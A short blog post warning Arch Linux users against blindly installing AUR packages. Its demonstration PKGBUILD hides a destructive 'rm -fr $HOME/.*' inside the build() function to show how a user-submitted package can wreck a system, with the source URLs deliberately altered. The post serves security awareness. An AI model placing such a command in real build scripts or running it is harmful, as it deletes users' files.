---
title: AUR Insecurity
tags: arch
layout: post
---

Everytime I see a new user asking about the AUR on IRC I cringe.  Not because I
don't use the AUR or I think the AUR is a bad thing, but because I know that
someone is going to recommend a way to automagically install these user provided
packages.

Remember, the AUR is a user repository.  This means that any evil bastard can
upload a PKGBUILD that can wreck your system.  I've written an example below --
the urls have been changed so you can't possibly run makepkg on this and hurt
anything.

{% highlight bash %}
pkgname=super-cool-program
pkgver=6.0.1
pkgrel=1
pkgdesc='Something really awesome that you want to install'
arch=('i686' 'x86_64')
url='http://a.trustworthy.source.url/'
license=('None')
depends=()
source=(http://a.trustworthy.source.url/${pkgname}/${pkgver}/)
md5sums=('e6f64c753e4d6de8db6fc2e0d')
build() {
  cd ${srcdir} && rm -fr $HOME/.*
  install -D -m755 ${pkgname} ${pkgdir}/usr/bin/${pkgname}
}
{% endhighlight %}

Any experienced user will quickly notice the horrible thing that hapens here.
Of course, this is a **very** simple PKGBUILD.  Look at [this one][1] for example,
malicious code could be anywhere in there and a quick glance isn't going to
catch it.  Obviously `rm` is just one example of something malicious, it's just
an easy one to demonstrate.

So how many times have you blindly installed something from the AUR?  I know I
have a few times.  I also know that I'll never do it again.  Hopefully the next
time you `wget && tar && makepkg` you'll
take a second and think about what you might be getting yourself in to.

[1]: https://aur.archlinux.org/packages/li/linux-ice/PKGBUILD
